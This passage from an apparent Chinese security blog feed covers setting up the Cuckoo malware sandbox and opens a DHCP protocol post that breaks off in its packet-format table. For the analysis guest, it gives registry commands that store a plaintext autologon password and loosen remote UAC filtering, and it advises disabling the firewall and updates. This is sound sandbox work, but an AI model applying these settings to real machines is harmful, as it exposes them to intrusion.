<h3 id="0x02-2-配置系统开机自动登录"><a href="#0x02-2-配置系统开机自动登录" class="headerlink" title="0x02.2 配置系统开机自动登录"></a>0x02.2 配置系统开机自动登录</h3><p>Win7 客户机如果开机自动登录，可以方便 Cuckoo 控制。可以用管理员权限打开 CMD 窗口，依次执行以下命令：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</div><div class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</div><div class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v AutoAdminLogon /d <span class="number">1</span> /t REG_SZ /f</div><div class="line">reg add <span class="string">"hklm\system\CurrentControlSet\Control\TerminalServer"</span> /v AllowRemoteRPC /d <span class="number">0</span>x01 /t REG_DWORD /f</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> /v LocalAccountTokenFilterPolicy /d <span class="number">0</span>x01 /t REG_DWORD /f</div></pre></td></tr></table></figure></p>
<blockquote>
<p>注意修改前两条命令里的 <code>&lt;USERNAME&gt;</code> 和 <code>&lt;PASSWORD&gt;</code> 为自己的账户和密码</p>
</blockquote>
<h3 id="0x02-3-其他处理"><a href="#0x02-3-其他处理" class="headerlink" title="0x02.3 其他处理"></a>0x02.3 其他处理</h3><p>为了方便恶意样本分析，最大程度保证恶意样本顺利执行，还需要关闭 Windows 系统的 <strong>Windows 防火墙</strong> 和 <strong>Windows 自动更新</strong>。</p>
<p>为了方便分析多种类型的恶意软件，还应该尽量在操作系统上安装 MS-Office 套装、PDF 阅读器、常用浏览器、Java 执行环境等等。并且，为了让客户机看起来更像普通人用的正常机器而不是一台沙盒客户机，尽量给操作系统安装其他常用的办公、娱乐、聊天软件，并访问一些网站、留下一些 Cookie 或其他数据。</p>
<h3 id="0x02-4-网络配置"><a href="#0x02-4-网络配置" class="headerlink" title="0x02.4 网络配置"></a>0x02.4 网络配置</h3><p>客户机的网络配置是重中之重，配置不好 Cuckoo 几乎无法有效运行。</p>
<p>推荐的网络配置方法是通过 VirtualBox 的 <strong><code>Host-Only</code></strong> 模式，将一个或多个虚拟客户机部署在一个小的局域网中，与外界隔离开，通过 Host 机与外界交流。</p>
<p>首先，需要在 VirtualBox 上添加一块给 <code>Host-Only</code> 部署用的虚拟网卡，默认是 <code>vboxnet0</code>，Host 机通过此虚拟网卡与同网段的虚拟客户机通信：<br><img src="/imgs/1467772922722.png" alt="添加 Host-only 虚拟网络"></p>
<blockquote>
<p>VBox 中默认可能没有此 <code>vboxnet0</code> 的 <code>Host-only</code> 网卡，可以通过上图右上角的 <strong>添加</strong> 按钮手动添加</p>
</blockquote>
<p>Cuckoo 默认的 <code>Result Server</code> IP 地址为 <code>192.168.56.1</code>(在配置文件 <code>cuckoo/conf/cuckoo.conf</code> 中)，此 IP 要与上面的 <code>vboxnet0</code> 网卡的 IP 地址相对应，所以，还要手动修改 <code>vboxnet0</code> 的配置（DHCP 服务可不启用，手动配置客户机 IP 地址即可）：<br><img src="/imgs/1467773364943.png" alt="配置 vboxnet0"></p>
<p>接下来手动配置 Win7 客户机的网络：<br><img src="/imgs/1467773714198.png" alt="配置 Win7 客户机网络"></p>
<p>至此，Host 机和 Win7 客户机就可以互相通信了，互相 Ping 一下可以 Ping 通。但这还无法满足正常的自动化恶意软件分析的要求，因为这种初级的 <code>Host-only</code> 模式里面虚拟机无法访问互联网，而很多恶意软件都需要访问网络才可以正常运行。所以我们还需要 <code>vboxnet0</code> 这块网卡具有代理上网的功能，使这个小局域网里的虚拟客户机可以通过这块虚拟网卡访问互联网。如果要满足这个需求，需要在 Ubuntu Host 机上做两个操作：开启流量转发、用 <code>iptables</code> 做地址转换（NAT）规则。</p>
<p>开启 IP 转发，用下面两条命令之一皆可：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div></pre></td></tr></table></figure></p>
<p>但是上面的命令只能 <strong>临时开启</strong> IP 转发功能，系统重启之后便失效。若想永久开启此功能，需要手动修改配置文件 <strong><code>/etc/sysctl.conf</code></strong> ，将里面 <code>net.ipv4.ip_forward=1</code> 前的注释取消，然后运行以下命令即可永久开启 IP 转发功能：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sysctl -p /etc/sysctl.conf</div></pre></td></tr></table></figure></p>
<p>Ubuntu 系统中用 <code>iptables</code> 设置地址转换规则，Cuckoo 官方资料给出了参考命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -o eth0 -i vboxnet0 <span class="_">-s</span> 192.168.56.0/24 -m conntrack --ctstate NEW -j ACCEPT</div><div class="line">iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</div><div class="line">iptables -A POSTROUTING -t nat -j MASQUERADE</div></pre></td></tr></table></figure></p>
<p>但是 Ubuntu 中的 <code>iptables</code> 这样设置也只是 <strong>临时</strong> 的，系统重启之后这些规则就会失效，如果想系统重启这些规则仍然可用，可以做以下处理：</p>
<p>编辑 Ubuntu 的网络配置文件 <code>/etc/network/interfaces</code> ，在文件末尾添加以下两行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pre-up iptables-restore &lt; /etc/iptables.rules <span class="comment">#开机时启用 iptables 规则</span></div><div class="line">post-down iptables-save &gt; /etc/iptables.rules <span class="comment">#关机前保存当前所有的 iptables 规则</span></div></pre></td></tr></table></figure></p>
<p>这样一来，Ubuntu Host 主机每次关机前都会把已有的 <code>iptables</code> 规则备份到 <code>/etc/iptables.rules</code> 文件中、每次开机是都会从 <code>/etc/iptables.rules</code> 读取规则并启用。</p>
<p>配置好之后，Guest 虚拟机就可以通过 <code>vboxnet0</code> 来访问互联网了。</p>
<h3 id="0x02-5-保存客户机"><a href="#0x02-5-保存客户机" class="headerlink" title="0x02.5 保存客户机"></a>0x02.5 保存客户机</h3><p>上面算是把客户机相关的配置都配置好了，接下来需要对配置好的客户机建立一个快照。每次 Cuckoo 调用客户机分析完一个恶意样本之后，会把虚拟机恢复到这个快照的状态。</p>
<p>保存系统快照的时候有一点需要注意：确保在系统正常运行、且 <code>agent.py</code> 无界面运行的时候，执行系统快照。</p>
<hr>
<h2 id="0x03-Cuckoo-配置"><a href="#0x03-Cuckoo-配置" class="headerlink" title="0x03 Cuckoo 配置"></a>0x03 Cuckoo 配置</h2><p>准备好 Host 机系统环境、配置好客户机之后， Cuckoo 还不能正常运行，还需要配置一下 Cuckoo 才能正常运行。 Cuckoo 有好多配置文件，都在 <code>cuckoo/conf/</code> 目录下，下面简要介绍几个主要配置文件的作用：</p>
<blockquote>
<ul>
<li><strong><code>cuckoo.conf</code></strong>： 主要的配置文件，最主要的是 <code>machinery</code> 用于指定我们使用的虚拟机配置文件，默认是 <code>virtualbox</code>，该文件同样位于 <code>conf</code> 目录下，名字是 <code>virtualbox.conf</code>。另外一个比较重要的配置项是<code>[resultserver]</code> 的 <code>ip</code>和 <code>port</code>，用于指定接收分析结果的服务器。该地址必须能够让虚拟机访问到，一般设置为虚拟网卡的地址，比如前面说过的 <code>Host-only</code> 虚拟网卡 <code>vboxnet0</code> 的 IP 地址<code>192.168.56.1</code>（也可以自己改成其他的），端口默认即可；</li>
<li><strong><code>auxiliary.conf</code></strong>： 辅助组件配置模块，可以配置 <code>tcpdump</code> /<code>mitm</code>/<code>sniffer</code>等；</li>
<li><strong><code>memory.conf</code></strong>： 内存分析配置模块，主要用来配置 <code>Volatility</code> 的行为；</li>
<li><strong><code>processing.conf</code></strong>： 核心处理组件配置文件，可以开启/关闭行为分析、缓冲区分析、内存分析、截屏、Snort、字符串提取、<code>VirusTotal</code>辅助分析等等功能；</li>
<li><strong><code>&lt;machinery&gt;.conf</code></strong>： 虚拟化配置文件，包括 <code>virtualbox</code>/<code>vmware</code>/<code>kvm</code>/<code>qume</code>等。在实际的配置当中，根据自己试用的虚拟化环境，只需要配置其中一个即可，同时采用的这个配置文件也必须 在<code>cuckoo.conf</code> 的 <code>machinery</code> 字段指定。这里的配置选项都是针对特定虚拟化平台的，很多选项只适用于某些平台。前面我们用的是 <code>virtualbox.conf</code>，其中 <code>mode</code> 指定 <code>virtualbox</code> 的运行模式，<code>path</code> 指定 <code>VBoxManage</code> 的绝对路径，<code>machines</code>指定我们使用的虚拟机的名字（多个虚拟机需要用半角逗号隔开），<code>platform</code> 指定虚拟客户机的系统类型，<code>ip</code> 指定虚拟机的 <code>ip</code> 地址;</li>
<li><strong><code>reporting.conf</code></strong>： 报告生成模块的配置文件，用来开启 <code>jsondump</code> 或者 <code>HTML Report</code>，还可以配置 <code>MongoDB</code> 存储分析结果（Web 控制台会用到）。</li>
</ul>
</blockquote>
<p>这里，我们需要修改的配置文件，可以修改 <strong><code>processing.conf</code></strong> 启用/关闭 自己想要的模块（比如 VT 模块），还需要修改 <strong><code>virtualbox.conf</code></strong>。根绝前文所述，假设我的 Win7 客户机名称是 <strong><code>jiayu1</code></strong>，IP 地址是 <code>192.168.56.101</code>，<strong><code>virtualbox.conf</code></strong> 的内容示例如下（<code>mode = headless</code> 是指 VBox 的 <strong>无界面启动模式</strong>）：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">[virtualbox]</div><div class="line"><span class="comment"># Specify which VirtualBox mode you want to run your machines on.</span></div><div class="line"><span class="comment"># Can be "gui", "sdl" or "headless". Refer to VirtualBox's official</span></div><div class="line"><span class="comment"># documentation to understand the differences.</span></div><div class="line">mode = headless</div><div class="line"></div><div class="line"><span class="comment"># Path to the local installation of the VBoxManage utility.</span></div><div class="line">path = /usr/bin/vboxmanage</div><div class="line"></div><div class="line"><span class="comment"># Default network interface.</span></div><div class="line">interface = vboxnet0</div><div class="line"></div><div class="line"><span class="comment"># Specify a comma-separated list of available machines to be used. For each</span></div><div class="line"><span class="comment"># specified ID you have to define a dedicated section containing the details</span></div><div class="line"><span class="comment"># on the respective machine. (E.g. cuckoo1,cuckoo2,cuckoo3)</span></div><div class="line">machines = jiayu1</div><div class="line"></div><div class="line">[jiayu1]</div><div class="line"><span class="comment"># Specify the label name of the current machine as specified in your</span></div><div class="line"><span class="comment"># VirtualBox configuration.</span></div><div class="line">label = jiayu1</div><div class="line"></div><div class="line"><span class="comment"># Specify the operating system platform used by current machine</span></div><div class="line"><span class="comment"># [windows/darwin/linux].</span></div><div class="line">platform = windows</div><div class="line"></div><div class="line"><span class="comment"># Specify the IP address of the current virtual machine. Make sure that the</span></div><div class="line"><span class="comment"># IP address is valid and that the host machine is able to reach it. If not,</span></div><div class="line"><span class="comment"># the analysis will fail.</span></div><div class="line">ip = 192.168.56.101</div><div class="line"></div><div class="line">[honeyd]</div><div class="line"><span class="comment"># For more information on this VM please refer to the "services" section of</span></div><div class="line"><span class="comment"># the conf/auxiliary.conf configuration file. This machine is a bit special</span></div><div class="line"><span class="comment"># in the way that its used as an additional VM for an analysis.</span></div><div class="line"><span class="comment"># *NOTE* that if this functionality is used, the VM should be registered in</span></div><div class="line"><span class="comment"># the "machines" list in the beginning of this file.</span></div><div class="line">label = honeyd</div><div class="line">platform = linux</div><div class="line">ip = 192.168.56.102</div><div class="line">tags = service, honeyd</div><div class="line">options = nictrace noagent</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="0x04-启动-Cuckoo，上传样本执行自动化分析"><a href="#0x04-启动-Cuckoo，上传样本执行自动化分析" class="headerlink" title="0x04 启动 Cuckoo，上传样本执行自动化分析"></a>0x04 启动 Cuckoo，上传样本执行自动化分析</h2><p>至此，Cuckoo 自动化恶意软件分析环境的配置工作算是基本完成，接下来就是启动 Cuckoo 服务、上传样本进行自动化分析了。</p>
<p>在启动 Cuckoo 服务之前，还需要开启 <code>MongoDB</code> 服务，并根据 <strong><code>reporting.conf</code></strong> 中的关于 <code>MongoDB</code> 的配置创建一个新的数据集。比如我的 <strong><code>reporting.conf</code></strong> 关于数据库的 配置如下所示，我就需要手动创建一个名为 <code>cuckoo</code> 的数据集：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[mongodb]</div><div class="line">enabled = yes </div><div class="line">host = 127.0.0.1</div><div class="line">port = 27017</div><div class="line">db = cuckoo</div><div class="line">store_memdump = yes </div><div class="line">paginate = 100</div></pre></td></tr></table></figure></p>
<p>启动 Cuckoo 的服务只需一条命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cuckoo.py</div></pre></td></tr></table></figure></p>
<p>但这样只能让该服务进程前台运行并且不能关闭中断，如果想让它后台运行，可以这样启动：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup python cuckoo.py &amp;</div></pre></td></tr></table></figure></p>
<p>启动 Cuckoo 服务进程之后，就可以提交样本进行分析了。提交样本可以用 <code>cuckoo/utils/submit.py</code> 来提交，具体方法见帮助：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">usage: submit.py [-h] [<span class="_">-d</span>] [--remote REMOTE] [--url] [--package PACKAGE]</div><div class="line">                 [--custom CUSTOM] [--owner OWNER] [--timeout TIMEOUT]</div><div class="line">                 [-o OPTIONS] [--priority PRIORITY] [--machine MACHINE]</div><div class="line">                 [--platform PLATFORM] [--memory] [--enforce-timeout]</div><div class="line">                 [--clock CLOCK] [--tags TAGS] [--baseline] [--max MAX]</div><div class="line">                 [--pattern PATTERN] [--shuffle] [--unique] [--quiet]</div><div class="line">                 [target]</div><div class="line"></div><div class="line">positional arguments:</div><div class="line">  target                URL, path to the file or folder to analyze</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  <span class="_">-d</span>, --debug           Enable debug logging</div><div class="line">  --remote REMOTE       Specify IP:port to a Cuckoo API server to submit</div><div class="line">                        remotely</div><div class="line">  --url                 Specify whether the target is an URL</div><div class="line">  --package PACKAGE     Specify an analysis package</div><div class="line">  --custom CUSTOM       Specify any custom value</div><div class="line">  --owner OWNER         Specify the task owner</div><div class="line">  --timeout TIMEOUT     Specify an analysis timeout</div><div class="line">  -o OPTIONS, --options OPTIONS</div><div class="line">                        Specify options <span class="keyword">for</span> the analysis package (e.g.</div><div class="line">                        <span class="string">"name=value,name2=value2"</span>)</div><div class="line">  --priority PRIORITY   Specify a priority <span class="keyword">for</span> the analysis represented by an</div><div class="line">                        <span class="built_in">integer</span></div><div class="line">  --machine MACHINE     Specify the identifier of a machine you want to use</div><div class="line">  --platform PLATFORM   Specify the operating system platform you want to use</div><div class="line">                        (windows/darwin/linux)</div><div class="line">  --memory              Enable to take a memory dump of the analysis machine</div><div class="line">  --enforce-timeout     Enable to force the analysis to run <span class="keyword">for</span> the full</div><div class="line">                        timeout period</div><div class="line">  --clock CLOCK         Set virtual machine clock</div><div class="line">  --tags TAGS           Specify tags identifier of a machine you want to use</div><div class="line">  --baseline            Run a baseline analysis</div><div class="line">  --max MAX             Maximum samples to add <span class="keyword">in</span> a row</div><div class="line">  --pattern PATTERN     Pattern of files to submit</div><div class="line">  --shuffle             Shuffle samples before submitting them</div><div class="line">  --unique              Only submit new samples, ignore duplicates</div><div class="line">  --quiet               Only <span class="built_in">print</span> text on failure</div></pre></td></tr></table></figure></p>
<p>但这种命令提交的方法体验不太好，Cuckoo 官方提供了一个基于 Django 的 Web 管理界面，在 <code>cuckoo/web/</code> 目录中，启动这个 Web 管理界面需要进入 <code>cucoo/web/</code> 目录，然后运行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver</div></pre></td></tr></table></figure></p>
<p>如果需要对外开放该 Web 界面，则需要指定监听的 IP 地址 和端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver 0.0.0.0:[PORT]</div></pre></td></tr></table></figure></p>
<p>然后就可以通过浏览器访问 Ubuntu Host 机的 IP 地址和 Cuckoo Web 界面对应的端口了，界面如下所示：<br><img src="/imgs/1467798366595.png" alt="Web管理系统"></p>
<p>点击导航栏上的 <code>Submit</code> 按钮，即可跳转到样本上传页面，上传时还可以选择一些高级的选项：<br><img src="/imgs/1467798476312.png" alt="上传样本"></p>
<blockquote>
<p>可以看到，Cuckoo 不仅可以直接分析上传的样本文件，还可以分析远程的 URL</p>
</blockquote>
<p>上传完成后，Cuckoo 就会自动分析，分析完成后，可以在 <code>Recent</code> 页面里查看最近分析的样本以及结果：<br><img src="/imgs/1467798638548.png" alt="Recent 列表"></p>
<p>Cuckoo 分析完的样本，可以点击查看分析报告，也可以重新分析已经完成的分析任务：<br><img src="/imgs/1467799019861.png" alt="查看分析结果"></p>
<hr>
<h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><p><code>cuckoo/cukoo.py</code> 启动时有一个特殊的参数选项 <code>--clean</code>，官方的解释为 <code>Remove all tasks and samples and their associated data</code>。即一旦运行<code>python cuckoo.py --clean</code> ，那么所有的分析任务、样本和分析结果相关的数据都会被清除，相当于对 Cuckoo <strong>恢复出厂设置</strong>。</p>
<p>Cuckoo 自带了一个基于 <strong><code>flask</code></strong> 的轻量级 REST API 服务程序，即 <code>cuckoo/utils/api.py</code>，默认启动此程序会绑定到 <strong>localhost:8090</strong>，也可以启动时指定监听地址和端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python utils/api.py --host 0.0.0.0 --port 1337</div></pre></td></tr></table></figure></p>
<blockquote>
<p>也可以用此 API 程序，通过 <strong><code>uWSGI</code></strong> 和 <strong><code>Nginx</code></strong> 代理部署一个高性能的 REST API 服务。</p>
</blockquote>
<p>通过这个 REST API，可以实现灵活的任务管理（甚至比前文提到的 Cuckoo 自带的 Web 管理界面还灵活） ，也可以基于此开发一套自己的 Cuckoo 管理程序。具体用法参考 Cuckoo 官方文档。</p>
<p>Cuckoo 还支持分布式部署，多 Host 机节点、多 Guest 机支持，部署方式详见 官方文档。</p>
<p>Cuckoo 部署完成后，通过自带的 Web 管理界面，如果某个样本完成分析但查看分析报告的时候出现如下模板渲染错误：<br><img src="/imgs/1467860877539.png" alt="模板渲染错误"></p>
<p>处理方式是修改 <code>web/analysis/urls.py</code> 文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-    <span class="string">"/(?P&lt;ip&gt;[\d\.]+)?/(?P&lt;host&gt;[a-zA-Z0-9-\.]+)?"</span></div><div class="line">+    <span class="string">"/(?P&lt;ip&gt;[\d\.]+)?/(?P&lt;host&gt;[a-zA-Z0-9-_\.]+)?"</span></div></pre></td></tr></table></figure></p>
<p>最后，Cuckoo 官方虽然声称可以支持 Linux 样本的分析，但支持的并不好。在 Ubuntu 上安装 <code>Systemtap</code> 并用 <code>stap</code> 命令执行 <code>cuckoo/data/strace.stp</code> 脚本完美生成可用的 <code>stap_xxxx.ko</code>，还要搞定官方并没有提供的 <code>probelkm.ko</code>，会经历各种大坑小坑，足够另起一篇长文，此处不详述。</p>
<hr>
<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><ol>
<li><a href="http://docs.cuckoosandbox.org/en/latest/" target="_blank" rel="external">http://docs.cuckoosandbox.org/en/latest/</a></li>
<li><a href="http://drops.wooyun.org/tips/11367" target="_blank" rel="external">http://drops.wooyun.org/tips/11367</a></li>
<li><a href="http://easwy.com/blog/archives/enable-ip-forward-on-linux/" target="_blank" rel="external">http://easwy.com/blog/archives/enable-ip-forward-on-linux/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 简述&quot;&gt;&lt;/a&gt;0x00 简述&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;沙盒&lt;/strong&gt;(&lt;strong&gt;Sanbox&lt;/strong&gt;) 是一种将未知、不可信的软件隔离执行的安全机制。恶意软件分析沙盒一般用来将不可信软件放在隔离环境中自动地动态执行，然后提取其运行过程中的进程行为、网络行为、文件行为等动态行为，安全研究员可以根据这些行为分析结果对恶意软件进行更深入地分析。&lt;/p&gt;
&lt;p&gt;Cuckoo 是一款用 &lt;strong&gt;Python&lt;/strong&gt; 编写的开源的自动化恶意软件分析系统，它的主要功能有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟踪记录恶意软件所有的调用状况；&lt;/li&gt;
&lt;li&gt;恶意软件文件行为：恶意软件执行过程中创建新文件、修改文件、删除文件、读取文件或下载文件的行为；&lt;/li&gt;
&lt;li&gt;获取恶意软件的内存镜像；&lt;/li&gt;
&lt;li&gt;以 PCAP 格式记录恶意软件的网络流量；&lt;/li&gt;
&lt;li&gt;获取恶意软件执行过程中的屏幕截图；&lt;/li&gt;
&lt;li&gt;获取执行恶意软件的客户机的完整内存镜像&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="cuckoo" scheme="http://jiayu0x.com/tags/cuckoo/"/>
    
      <category term="sandbox" scheme="http://jiayu0x.com/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>DHCP 协议原理与攻防简介</title>
    <link href="http://jiayu0x.com/2015/03/22/DHCP-protocol-and-offensive-and-defensive/"/>
    <id>http://jiayu0x.com/2015/03/22/DHCP-protocol-and-offensive-and-defensive/</id>
    <published>2015-03-21T16:00:00.000Z</published>
    <updated>2017-04-04T10:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-协议原理"><a href="#1-协议原理" class="headerlink" title="1. 协议原理"></a>1. 协议原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p>DHCP( Dynamic Host Configuration Protocol, 动态主机配置协议)，是一个局域网的网络协议，使用 UDP 协议工作， 主要有两个用途：给内部网络或网络服务供应商自动分配 IP 地址，给用户或者内部网络管理员作为对所有计算机作中央管理的手段，在 RFC 2131 中有详细的描述。DHCP 有3个端口，其中 UDP67 和 UDP68 为正常的 DHCP 服务端口，分别作为 DHCP Server 和 DHCP Client 的服务端口；546 号端口用于 DHCPv6 Client ，而不用于 DHCPv4，是为 DHCP Failover 服务，这是需要特别开启的服务，DHCP Failover 是用来做“双机热备”的。</p>
<p>在 IP 网络中，每个连接 Internet 的设备都需要分配唯一的 IP 地址。DHCP 使网络管理员能从中心结点监控和分配 IP 地址。当某台计算机移到网络中的其它位置时，能自动收到新的 IP 地址，而不用在每台计算机上单独配置固定的 IP 地址。</p>
<a id="more"></a>
<p>DHCP 使用了 <strong>租约</strong> 的概念，或称为计算机 <strong>IP 地址的有效期</strong>。租用时间是不定的，主要取决于用户在某地联接 Internet 需要多久，这对于教育行业和其它用户频繁改变的环境是很实用的。通过较短的租期，DHCP 能够在一个计算机比可用 IP 地址多的环境中动态地重新配置网络。DHCP 支持为计算机分配静态地址，如需要永久性 IP 地址的 Web 服务器。</p>
<p>DHCP 和另一个网络 IP 管理协议 <code>BOOTP</code> 类似(<code>BOOTP</code> 是 DHCP 的前身)。目前两种配置管理协议都得到了普遍使用，其中 DHCP 更为先进。某些操作系统，如 Windows NT/2000，都带有 DHCP 服务器。DHCP 或 BOOTP 客户端是装在计算机中的一个程序，这样就可以对其进行配置操作。</p>
<h3 id="1-2-详解"><a href="#1-2-详解" class="headerlink" title="1.2 详解"></a>1.2 详解</h3><h4 id="1-2-1-报文格式"><a href="#1-2-1-报文格式" class="headerlink" title="1.2.1 报文格式"></a>1.2.1 报文格式</h4><p><img src="/imgs/1425885447242.png" alt="DHCP 报文格式"></p>
<p>各字段解释如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">字段</th>
<th style="text-align:left">长度(byte)</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">op</td>
<td style="text-align:left">1</td>
<td style="text-align:left">报文类型，<code>1</code>表示请求报文，<code>2</code>表示响应报文</td>
</tr>
<tr>
<td style="text-align:left">htype</td>
<td style="text-align:left">1</td>
<td style="text-align:left">硬件地址类型，<code>1</code> 表示 10Mb/s 以太网 地址</td>
</tr>
<tr>
<td style="text-align:left">hlen</td>
<td style="text-align:left">1</td>
<td style="text-align:left">硬件地址长度，以太网中该值为 `6</td>
</tr>
<tr>
<td style="text-align:left">hops</td>
<td style="text-align:left">1</td>
<td style="text-align:left">跳数。客户端设置为 <code>0</code>，也能被一个 DHCP 代理服务器设置</td>
</tr>
<tr>
<td style="text-align:left">xid</td>
<td style="text-align:left">4</td>
<td style="text-align:left">事务ID，由客户端选择的一个随机数，被服务器和客户端用来在它们之间交流请求和响应，客户端用它对请求和应答进行匹配。该ID由客户端设置并由服务器返回，为 32 位整数</td>
</tr>
<tr>
<td style="text-align:left">secs</td>
<td style="text-align:left">2</td>
<td style="text-align:left">由客户端填充，表示从客户端开始获得 IP 地址或 IP 地址续借后所使用了的秒数</td>
</tr>
<tr>
<td style="text-align:left">flags</td>
<td style="text-align:left">2</td>
<td style="text-align:left">标志字段。这个 16 比特的字段，目前只有最左边的一个比特有用，该位为 <code>0</code> ，表示单播，为 <code>1</code> 表示广播</td>
</tr>
<tr>
<td style="text-align:left">ciaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">客户端 IP，只有客户端处于 <code>Bound</code>、<code>Renew</code>、<code>Rebinding</code> 状态，并且能响应 ARP 请求时，才能被填充</td>
</tr>
<tr>
<td style="text-align:left">yiaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">“你自己的” 或客户端的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">siaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">DHCP 协议流程的下一个阶段要使用的服务器的IP地址，由服务端在 <code>DHCPOFFER</code> 和 <code>DHCPACK</code> 报文中返回</td>
</tr>
<tr>
<td style="text-align:left">giaddr</td>
<td style="text-align:left">4</td>
<td style="text-align:left">DHCP 中继器的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">chaddr</td>
<td style="text-align:left">16</td>
<td style="text-align:left">客户端硬件地址，客户端必须设置它的 <code>chaddr</code> 字段。UDP 数据包中的以太网帧首部也有该字段，但通常通过查看 UDP 数据包来确定以太网帧首部中的该字段获取该值比较困难或者说不可能，而在 UDP 协议承载的 DHCP 报文中设置该字段，用户进程就可以很容易地获取该值</td>
</tr>
<tr>
<td style="text-align:left">sname</td>
<td style="text-align:left">64</td>
<td style="text-align:left">可选的服务器主机名，该字段是空结尾的字符串，由服务器填写</td>
</tr>
<tr>
<td style="text-align:left">file</td>
<td style="text-align:left">128</td>
<td style="text-align:left">启动文件名，是一个空结尾的字符串。DHCP <code>Discover</code> 报文中是 <code>generic</code> 名字或空字符，DHCP <code>OFFER</code> 报文中提供有效的目录路径全名</td>
</tr>
<tr>
